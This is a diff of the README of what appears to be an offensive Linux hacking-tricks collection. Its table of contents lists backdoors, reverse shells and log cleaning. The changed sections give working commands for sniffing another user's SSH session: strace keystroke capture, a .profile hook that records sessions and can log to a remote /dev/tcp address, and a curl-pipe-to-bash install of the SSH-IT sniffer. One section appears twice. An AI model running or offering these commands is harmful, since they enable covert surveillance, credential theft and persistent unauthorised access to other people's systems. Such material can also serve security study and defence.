@@ -6,25 +6,25 @@ A collection of our favourite tricks. Many of those tricks are not from us. We m
 
 We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.
 
-Got tricks? Send them to root@thc.org or submit a pull request.
+Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 
 1. [Bash](#lbwh-anchor)
    1. [Leave Bash without history](#lbwh-anchor)
    1. [Hide your command](#hyc-anchor)
    1. [Hide your arguments](#hya-anchor)
-2. [SSH](#ais-anchor)
+1. [SSH](#ais-anchor)
    1. [Almost invisible SSH](#ais-anchor)
    1. [SSH tunnel OUT](#sto-anchor)
    1. [SSH tunnel IN](#sti-anchor)
    1. [SSH socks5 OUT](#sso-anchor)
    1. [SSH socks5 IN](#ssi-anchor)
-3. [Network](#network-anchor)
+1. [Network](#network-anchor)
    1. [ARP discover computers on the local network](#adln-anchor)
    1. [ICMP discover local network](#idln-anchor)
    1. [Monitor all new TCP connections](#mtc-anchor)
    1. [Alert on all new TCP connections](#atc-anchor)
    1. [Find your public IP address](#pip-anchor)
-4. [File Encoding and Transfer](#fe-anchor)
+1. [File Encoding and Transfer](#fe-anchor)
    1. [uuencode](#feu-anchor)
    1. [openssl](#feo-anchor)
    1. [xxd](#fex-anchor)
@@ -32,7 +32,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
    1. [File transfer using screen from REMOTE to LOCAL](#ftsrl-anchor)
    1. [File transfer using screen from LOCAL to REMOTE](#ftslr-anchor)
    1. [File transfer using gs-netcat and sftp](#ftgs-anchor)
-5. [Reverse Shell / Dumb Shell](#rs-anchor)
+1. [Reverse Shell / Dumb Shell](#rs-anchor)
    1. [Reverse Shells](#rs-anchor)
       1. [with gs-netcat](#rswg-anchor)
       1. [with Bash](#rswb-anchor)
@@ -44,26 +44,30 @@ Got tricks? Send them to root@thc.org or submit a pull request.
       1. [Upgrade a reverse shell to a pty shell](#rsup-anchor)
       1. [Upgrade a reverse shell to a fully interactive shell](#rsup2-anchor)
       1. [Reverse shell with socat (fully interactive)](#rssc-anchor)
- 6. [Backdoors](#bd-anchor)
-    1. [Background reverse shell](#bdrs-anchor)
-    1. [authorized_keys](#bdak-anchor)
-    1. [Remote access an entire network](#bdra-anchor)
- 7. [Shell Hacks](#sh-anchor)
-    1. [Shred files (secure delete)](#shsf-anchor)
-    1. [Shred files without *shred*](#shsfwo-anchor)
-    1. [Restore the date of a file](#shrdf-anchor)
-    1. [Clean logfile](#shcl-anchor)
-    1. [Hide files from a User without root privileges](#shhu-anchor)
- 8. [Crypto](#cr-anchor)
-    1. [Generate quick random Password](#crgrp-anchor)
-    1. [Linux transportable encrypted filesystems](#crltefs-anchor)
-    1. [Encrypting a file](#cref-anchor)
- 9. [Miscellaneous](#misc-anchor)
-    1. [Sniff a user's SSH session](#sss-anchor)
-    1. [Sniff a user's SSH session without strace](#ssswos-anchor)
-    1. [Sniff a user's SSH session without root privileges](#ssswor-anchor)
-    1. [How to survive high latency connections](#hlc-anchor)
-    1. [Cool Linux commands](#cool-anchor) 
+1. [Backdoors](#bd-anchor)
+   1. [Background reverse shell](#bdrs-anchor)
+   1. [authorized_keys](#bdak-anchor)
+   1. [Remote access an entire network](#bdra-anchor)
+1. [Shell Hacks](#sh-anchor)
+   1. [Shred files (secure delete)](#shsf-anchor)
+   1. [Shred files without *shred*](#shsfwo-anchor)
+   1. [Restore the date of a file](#shrdf-anchor)
+   1. [Clean logfile](#shcl-anchor)
+   1. [Hide files from a User without root privileges](#shhu-anchor)
+1. [Crypto](#cr-anchor)
+   1. [Generate quick random Password](#crgrp-anchor)
+   1. [Linux transportable encrypted filesystems](#crltefs-anchor)
+      1. [cryptsetup](#crltefs-anchor)
+      1. [EncFS](#crencfs-anchor)
+   1. [Encrypting a file](#cref-anchor)
+1. [Sniffing a user's SSH session](#misc-anchor)
+   1. [with strace](#sss-anchor)
+   1. [with script](#ssswos-anchor)
+   1. [with a wrapper script](#ssswor-anchor)
+   1. [with SSH-IT](#sshit-anchor)
+1. [Miscellaneous](#misc-anchor)
+   1. [How to survive high latency connections](#hlc-anchor)
+   1. [Cool Linux commands](#cool-anchor) 
     
    
 
@@ -641,7 +645,7 @@ head -c 32 < /dev/urandom | base64 | tr -dc '[:alpha:]' | head -c 16
 ```
 
 <a id="crltefs-anchor"></a>
-**8.ii. Linux transportable encrypted filesystems**
+**8.ii.a. Linux transportable encrypted filesystems - cryptsetup**
 
 Create a 256MB large encrypted file system. You will be prompted for a password.
 
@@ -667,6 +671,19 @@ umount /mnt/crypted
 cryptsetup close crypted
 losetup -d /dev/loop0
 ```
+<a id="crencfs-anchor"></a>
+**8.ii.b. Linux transportable encrypted filesystems - EncFS**
+
+Create ```.sec``` and store the encrypted data in ```.raw```:
+```sh
+mkdir .raw .sec
+encfs --standard  "${PWD}/.raw" "${PWD}/.sec"
+```
+
+unmount:
+```sh
+fusermount -u .sec
+```
 
 <a id="cref-anchor"></a>
 **8.iii Encrypting a file**
@@ -686,14 +703,14 @@ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.
 ---
 <a id="misc-anchor"></a>
 <a id="sss-anchor"></a>
-**9.i. Sniff a user's SSH session**
+**9.i Sniff a user's SSH session with strace**
 ```sh
 strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
 ```
 Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.
 
 <a id="ssswos-anchor"></a>
-**9.ii Sniff a user's SSH session without strace**
+**9.ii Sniff a user's SSH session with script**
 
 The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
 ```sh
@@ -702,7 +719,7 @@ echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
 Consider using [zap-args](#hya-anchor) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
 
 <a id="ssswor-anchor"></a>
-**9.iii. Sniff a user's SSH session without root privileges**
+**9.iii. Sniff a user's SSH session with a wrapper script**
 
 Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)
 
@@ -743,8 +760,27 @@ To uninstall cut & paste this\033[0m:\033[1;36m
 
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
+<a id="sshit-anchor"></a>
+**9.iv Sniff a user's SSH session using SSH-IT**
+
+The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).
+
+```sh
+bash -c "$(curl -fsSL ssh-it.thc.org/x)"
+```
+
+<a id="ssswos-anchor"></a>
+**9.ii Sniff a user's SSH session without strace**
+
+The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
+```sh
+echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
+```
+Consider using [zap-args](#hya-anchor) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+
+
 <a id="hlc-anchor"></a>
-**9.iii. How to survive high latency connections**
+**10.i. How to survive high latency connections**
 
 Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. *rlwrap* comes to the rescue. It buffers all single keystrokes until *Enter* is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...
 
@@ -758,7 +794,7 @@ Example for *SSH*:
 rlwrap ssh user@host
 ```
 <a id="cool-anchor"></a>
-**9.iv. Cool Linux commands**
+**10.ii. Cool Linux commands**
 
 1. https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/
 1. https://github.com/ibraheemdev/modern-unix
